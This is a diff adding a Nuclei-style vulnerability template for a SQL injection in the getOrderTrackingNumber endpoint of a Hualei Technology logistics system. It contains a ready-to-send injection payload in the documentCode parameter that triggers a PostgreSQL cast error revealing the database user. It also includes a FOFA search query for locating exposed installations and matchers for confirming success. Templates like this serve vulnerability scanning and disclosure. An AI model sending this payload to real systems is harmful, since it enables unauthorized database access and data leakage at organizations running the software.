@@ -1,0 +1,32 @@
+id: hlkj-getOrderTrackingNumber-sqli
+
+info:
+  name: 华磊科技物流系统-SQL注入-getOrderTrackingNumber
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: body="l_c_bar"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /getOrderTrackingNumber.htm?documentCode=1'and%0a1=user::integer-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+    - type: word
+      part: body
+      words:
+      - 获取异常
+      - PSQLException
+      - integer
+      condition: and
